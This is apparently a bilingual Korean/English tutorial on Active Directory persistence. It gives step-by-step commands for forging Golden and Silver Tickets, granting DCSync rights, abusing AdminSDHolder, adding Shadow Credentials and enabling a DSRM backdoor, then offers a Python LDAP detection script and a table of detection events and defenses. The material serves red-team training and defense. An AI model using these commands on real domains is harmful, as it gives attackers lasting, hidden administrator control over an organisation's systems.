> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# AD 지속성 — Golden Ticket·ACL 조작·탐지 CLI

## 1. AD 지속성 기법 분류

```
도메인 장악 후 지속성 유지 방법:

[티켓 기반]
  Golden Ticket  — krbtgt 해시로 임의 TGT 위조 (20년 유효)
  Silver Ticket  — 서비스 계정 해시로 서비스 티켓 위조
  Diamond Ticket — 정상 TGT 수정 (탐지 어려움)
  Sapphire Ticket — PAC 암호화 유지 (FAST 우회)

[계정 기반]
  관리자 계정 생성
  AdminSDHolder 수정 — 보호 계정 ACL 전파
  DSRM 비밀번호 설정
  골든 gMSA — gMSA 계정 해시 탈취

[객체 기반]
  DCSync 권한 ACL — DS-Replication 권한 부여
  Shadow Credentials — msDS-KeyCredentialLink 수정
  SID History 주입
  DCOM 백도어
  GPO 지속성
```

---

## 2. Golden Ticket

```bash
# 1단계: krbtgt 해시 획득 (DCSync)
python3 secretsdump.py -just-dc-user krbtgt domain.local/admin:Password@DC_IP

# 2단계: 도메인 SID 획득
python3 getPac.py domain.local/admin:Password@DC_IP
# 또는
powershell: (Get-ADDomain).DomainSID.Value

# 3단계: Golden Ticket 생성 (Impacket)
python3 ticketer.py \
  -nthash KRBTGT_NTLM_HASH \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain domain.local \
  -duration 87600 \
  administrator

# 4단계: 티켓 사용
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@dc.domain.local

# Mimikatz (Windows)
mimikatz # kerberos::golden /user:fakeuser /domain:domain.local \
  /sid:S-1-5-21-XXXX /krbtgt:HASH /id:500 /groups:512 /ptt
mimikatz # misc::cmd
```

---

## 3. Silver Ticket

Silver Ticket는 특정 서비스에만 유효하고 KDC와 통신하지 않아 탐지가 어렵다.

```bash
# CIFS (SMB) Silver Ticket
python3 ticketer.py \
  -nthash SERVICE_ACCOUNT_NTLM \
  -domain-sid S-1-5-21-XXXX \
  -domain domain.local \
  -spn cifs/server.domain.local \
  administrator

export KRB5CCNAME=administrator.ccache
python3 smbclient.py -k -no-pass //server.domain.local/C$

# HOST Silver Ticket (WMI/원격 스케줄러)
python3 ticketer.py -nthash HASH -domain-sid SID -domain domain.local \
  -spn host/server.domain.local administrator
```

---

## 4. ACL 기반 지속성

### 4.1 DCSync 권한 부여

```powershell
# PowerView로 DCSync 권한 부여
Import-Module PowerView.ps1

$attacker = "DOMAIN\attacker_user"

# DS-Replication-Get-Changes
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" `
  -PrincipalIdentity $attacker `
  -Rights DCSync `
  -Verbose

# 확인
Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs |
  Where-Object {$_.SecurityIdentifier -match (Get-ADUser $attacker).SID}
```

### 4.2 AdminSDHolder 남용

```powershell
# AdminSDHolder 컨테이너에 권한 추가
# SDProp (60분마다) 실행 시 보호 계정에 권한 전파됨
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" `
  -PrincipalIdentity attacker_user `
  -Rights All

# SDProp 즉시 실행 (관리자 권한)
Invoke-SDPropagator -ShowProgress -timeoutMinutes 1
```

### 4.3 Shadow Credentials

```bash
# pywhisker — msDS-KeyCredentialLink 수정
python3 pywhisker.py -d domain.local -u admin -p Password \
  --target victim_user --action add --filename shadow_cert

# 생성된 인증서로 인증
python3 gettgtpkinit.py domain.local/victim_user -cert-pfx shadow_cert.pfx \
  -pfx-pass pfx_password victim.ccache

export KRB5CCNAME=victim.ccache
python3 getnthash.py domain.local/victim_user -key session_key
```

---

## 5. DSRM 백도어

```powershell
# DSRM (Directory Services Restore Mode) 계정 활성화
# 모든 DC에 로컬 관리자 계정이 존재 (오프라인 복구용)

# DSRM 패스워드 변경
ntdsutil "set dsrm password" "reset password on server DC1" null

# 레지스트리 설정 — 네트워크 로그인 허용
New-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\`
  -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD

# PtH로 DSRM 계정 사용
python3 secretsdump.py -sam -hashes :DSRM_HASH ./administrator@DC_IP
```

---

## 6. AD 지속성 탐지 CLI

```python
#!/usr/bin/env python3
"""AD 지속성 기법 탐지 자동화 CLI."""

import argparse
import json
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from ldap3 import ALL, NTLM, SAFE_SYNC, Connection, Server, SUBTREE


DANGEROUS_ACLS = {
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
    "0e10c968-78fb-11d2-90d4-00c04f79dc55": "Certificate-Enrollment",
}

PROTECTED_GROUPS = [
    "Domain Admins", "Enterprise Admins", "Administrators",
    "Schema Admins", "Account Operators", "Backup Operators",
    "Print Operators", "Server Operators", "Group Policy Creator Owners",
]


@dataclass
class PersistenceIndicator:
    indicator_type: str
    subject: str
    detail: str
    risk: str
    detected_at: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )


class ADPersistenceDetector:
    def __init__(
        self,
        dc_ip: str,
        domain: str,
        username: str,
        password: str,
    ) -> None:
        self.base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=NTLM,
            client_strategy=SAFE_SYNC,
            auto_bind=True,
        )

    def check_admin_account_creation(self, days: int = 30) -> list[PersistenceIndicator]:
        """최근 생성된 관리자 그룹 멤버 탐지."""
        indicators: list[PersistenceIndicator] = []
        from datetime import timedelta

        cutoff = datetime.now(timezone.utc) - timedelta(days=days)

        for group in PROTECTED_GROUPS:
            group_dn = f"CN={group},CN=Users,{self.base_dn}"
            self.conn.search(
                search_base=self.base_dn,
                search_filter=f"(&(memberOf={group_dn})(whenCreated>={cutoff.strftime('%Y%m%d%H%M%SZ')}))",
                attributes=["sAMAccountName", "whenCreated", "description"],
            )
            for entry in self.conn.entries:
                indicators.append(PersistenceIndicator(
                    indicator_type="NEW_ADMIN_ACCOUNT",
                    subject=str(entry.sAMAccountName),
                    detail=f"Group: {group}, Created: {entry.whenCreated}",
                    risk="HIGH",
                ))

        return indicators

    def check_pwdneverexpires(self) -> list[PersistenceIndicator]:
        """패스워드 만료 없는 계정 탐지 (백도어 가능성)."""
        indicators: list[PersistenceIndicator] = []

        # userAccountControl bit 65536 = DONT_EXPIRE_PASSWORD
        self.conn.search(
            search_base=self.base_dn,
            search_filter="(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(objectClass=computer)))",
            attributes=["sAMAccountName", "memberOf", "lastLogonTimestamp"],
        )

        for entry in self.conn.entries:
            username = str(entry.sAMAccountName)
            members = entry.memberOf.values if hasattr(entry.memberOf, 'values') else []
            is_privileged = any(
                g.upper() in str(m).upper()
                for g in ["DOMAIN ADMINS", "ADMINISTRATORS"]
                for m in members
            )
            indicators.append(PersistenceIndicator(
                indicator_type="PWD_NEVER_EXPIRES",
                subject=username,
                detail=f"In privileged group: {is_privileged}",
                risk="HIGH" if is_privileged else "MEDIUM",
            ))

        return indicators

    def check_shadow_credentials(self) -> list[PersistenceIndicator]:
        """msDS-KeyCredentialLink 수정 탐지 (Shadow Credentials)."""
        indicators: list[PersistenceIndicator] = []

        self.conn.search(
            search_base=self.base_dn,
            search_filter="(msDS-KeyCredentialLink=*)",
            attributes=["sAMAccountName", "msDS-KeyCredentialLink"],
        )

        for entry in self.conn.entries:
            indicators.append(PersistenceIndicator(
                indicator_type="SHADOW_CREDENTIALS",
                subject=str(entry.sAMAccountName),
                detail=f"KeyCredential count: {len(entry['msDS-KeyCredentialLink'].values)}",
                risk="HIGH",
            ))

        return indicators

    def run_all_checks(self) -> list[PersistenceIndicator]:
        all_indicators: list[PersistenceIndicator] = []

        print("[*] Checking new admin account creation...")
        all_indicators.extend(self.check_admin_account_creation())

        print("[*] Checking password never expires accounts...")
        all_indicators.extend(self.check_pwdneverexpires())

        print("[*] Checking Shadow Credentials...")
        all_indicators.extend(self.check_shadow_credentials())

        return all_indicators

    def close(self) -> None:
        self.conn.unbind()


def main() -> None:
    parser = argparse.ArgumentParser(description="AD Persistence Detection")
    parser.add_argument("dc", help="DC IP")
    parser.add_argument("domain", help="Domain (e.g.: corp.local)")
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("-o", "--output", type=Path)
    args = parser.parse_args()

    detector = ADPersistenceDetector(args.dc, args.domain, args.user, args.password)
    indicators = detector.run_all_checks()
    detector.close()

    risk_counts = {"HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for ind in indicators:
        risk_counts[ind.risk] = risk_counts.get(ind.risk, 0) + 1
        icon = "!" if ind.risk == "HIGH" else "?"
        print(f"\n[{icon}] [{ind.risk}] {ind.indicator_type}")
        print(f"  Subject: {ind.subject}")
        print(f"  Detail: {ind.detail}")

    print(f"\nTotal {len(indicators)} — HIGH:{risk_counts['HIGH']} / MEDIUM:{risk_counts['MEDIUM']}")

    if args.output:
        args.output.write_text(
            json.dumps(
                [vars(i) for i in indicators],
                indent=2, ensure_ascii=False,
            )
        )


if __name__ == "__main__":
    main()
```

---

## 7. 지속성 방어 및 탐지

| 지속성 기법 | 탐지 이벤트 | 방어 |
|-------------|-------------|------|
| Golden Ticket | 4769 — RC4 암호화 TGS / 비존재 사용자 | krbtgt 정기 재설정 (2회) + AES 강제 |
| Silver Ticket | 4627 — 서비스 접근 이상 | PAC 검증 활성화 |
| DCSync | 4662 — DS-Replication 이벤트 | SIEM 룰 / Canary 계정 |
| Shadow Credentials | 5136 — 디렉터리 서비스 수정 | msDS-KeyCredentialLink 변경 모니터링 |
| AdminSDHolder | 5136 — AdminSDHolder 수정 | SDProp 로그 모니터링 |
| 신규 관리자 | 4728, 4732 — 그룹 멤버 추가 | 보호 그룹 변경 알림 |
| DSRM 활성화 | 레지스트리 변경 | DsrmAdminLogonBehavior=0 강제 |

---

<a name="english"></a>

# AD Persistence — Golden Ticket, ACL Manipulation, and Detection CLI

## 1. AD Persistence Technique Classification

After domain dominance, attackers establish multiple persistence mechanisms to maintain long-term access even if their initial foothold is discovered.

**Ticket-based persistence:**
- **Golden Ticket** — forged TGT signed with krbtgt hash, valid for up to 20 years
- **Silver Ticket** — forged service ticket, doesn't touch KDC (harder to detect)
- **Diamond Ticket** — modified legitimate TGT (evades PAC validation)
- **Sapphire Ticket** — maintains PAC encryption (bypasses FAST)

**Account-based persistence:**
- Create backdoor administrator accounts
- Modify AdminSDHolder (propagates ACL to all protected accounts via SDProp)
- Set DSRM password (every DC has a local admin account for offline recovery)
- Steal gMSA account hash

**Object-based persistence:**
- Grant DCSync rights via ACL modification
- Shadow Credentials — modify `msDS-KeyCredentialLink` for certificate-based auth backdoor
- SID History injection
- DCOM backdoor
- GPO persistence

---

## 2. Golden Ticket

The Golden Ticket attack forges a TGT that the KDC accepts as valid because it's correctly signed with the krbtgt secret. This grants the bearer access to any service in the domain.

**Four steps:**
1. Obtain krbtgt NTLM hash via DCSync
2. Obtain domain SID
3. Forge the Golden Ticket with `ticketer.py` or Mimikatz
4. Use `KRB5CCNAME` to authenticate with the forged ticket

**Note:** Since the ticket is valid even for non-existent usernames, this bypass works even after the compromised account is disabled.

---

## 3. Silver Ticket

Unlike the Golden Ticket, the Silver Ticket targets a specific service and is signed with the service account's hash rather than krbtgt. The advantage is that no KDC communication occurs during authentication — the service validates the ticket directly. This makes Silver Tickets significantly harder to detect.

**Common Silver Ticket targets:**
- `cifs/server` — SMB file access
- `host/server` — WMI, Task Scheduler
- `http/server` — IIS web services
- `mssql/server` — SQL Server access

---

## 4. ACL-based Persistence

### 4.1 Granting DCSync Rights

Adding `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights to a non-DC account allows that account to perform DCSync at any time. This is a stealthy persistence mechanism since the account appears normal.

### 4.2 AdminSDHolder Abuse

AdminSDHolder is a special container that serves as a template for protected group member ACLs. Every 60 minutes, SDProp copies ACLs from AdminSDHolder to all members of protected groups (Domain Admins, Enterprise Admins, etc.). By adding an attacker account to AdminSDHolder, the backdoor propagates to all protected accounts automatically.

### 4.3 Shadow Credentials

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute to add an X.509 certificate credential to a target account. The attacker can then authenticate as that account using the certificate's private key, bypassing password-based detection.

---

## 5. DSRM Backdoor

Every Domain Controller has a local administrator account (DSRM account) used for offline directory recovery. By setting a known DSRM password and enabling network logon via registry key (`DsrmAdminLogonBehavior = 2`), an attacker gains persistent local admin access to all DCs even after domain credential resets.

---

## 6. AD Persistence Detection CLI

The `ADPersistenceDetector` class performs three LDAP-based checks:

**`check_admin_account_creation(days=30)`** — finds accounts created within the last N days that are members of protected groups (Domain Admins, Enterprise Admins, etc.)

**`check_pwdneverexpires()`** — identifies user accounts with `DONT_EXPIRE_PASSWORD` flag set, especially those in privileged groups (potential backdoor accounts)

**`check_shadow_credentials()`** — finds any account with a non-empty `msDS-KeyCredentialLink` attribute, which indicates Shadow Credentials have been set

**Usage:**
```bash
python3 ad_persistence_detector.py 10.10.10.100 corp.local \
    -u auditor -p AuditPass123 -o persistence_findings.json
```

---

## 7. Persistence Defense and Detection

| Persistence Technique | Detection Event | Defense |
|-----------------------|----------------|---------|
| Golden Ticket | Event 4769 — RC4 encrypted TGS / non-existent user | Reset krbtgt password twice + enforce AES |
| Silver Ticket | Event 4627 — anomalous service access | Enable PAC validation |
| DCSync | Event 4662 — DS-Replication events | SIEM rule / canary accounts |
| Shadow Credentials | Event 5136 — directory service modification | Monitor msDS-KeyCredentialLink changes |
| AdminSDHolder | Event 5136 — AdminSDHolder modification | Monitor SDProp logs |
| New admin account | Events 4728, 4732 — group member addition | Alert on protected group changes |
| DSRM activation | Registry change | Force DsrmAdminLogonBehavior=0 |
